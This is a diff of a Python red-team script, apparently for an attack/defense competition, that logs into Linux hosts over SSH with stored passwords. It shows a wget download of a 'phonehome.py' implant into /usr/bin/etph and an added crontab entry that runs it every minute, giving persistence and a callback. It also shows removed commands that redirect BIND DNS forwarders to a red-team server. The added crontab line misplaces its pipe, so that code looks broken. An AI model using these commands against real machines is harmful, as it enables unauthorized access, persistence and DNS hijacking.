@@ -191,7 +191,7 @@ def universal_linux_attack(host):
     log_line(ssh.before.decode('utf8'), host)
     """
 
-    netcat_port = "1{}{}".format(host.team, host.last_octet)
+    #netcat_port = "1{}{}".format(host.team, host.last_octet)
     # https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script
     ssh.close()
 
@@ -201,14 +201,6 @@ def ubuntu_attacks(host):
     # sudo update-rc.d bind disable
     ssh = pxssh.pxssh()
     ssh.login(host.ip, host.username, password=host.password)
-    red_team_dns = "10.0.0.23"
-    change_forwarders_cmd = "sed -i s/172\.25.\.{}\.1/{}/g".format(red_team_dns)
-    reload_bind_cmd = '/etc/init.d/bind9 restart'
-
-    ssh.prompt()
-    ssh.sendline(change_forwarders_cmd)
-    ssh.prompt()
-    ssh.sendline(reload_bind_cmd)
 
      # ez mode /etc/group
     wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph" 
@@ -282,7 +274,12 @@ def centos_attacks(host):
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
     
-    echo -e "$(crontab -l)\n* * * * * /usr/bin/etph" | crontab -
+    ## Chown phone home
+    phonehome_crontab_cmd = r'echo -e "$(crontab -l)\n* * * * * /usr/bin/etph | crontab -"'
+    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_crontab_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
     
 
 main()
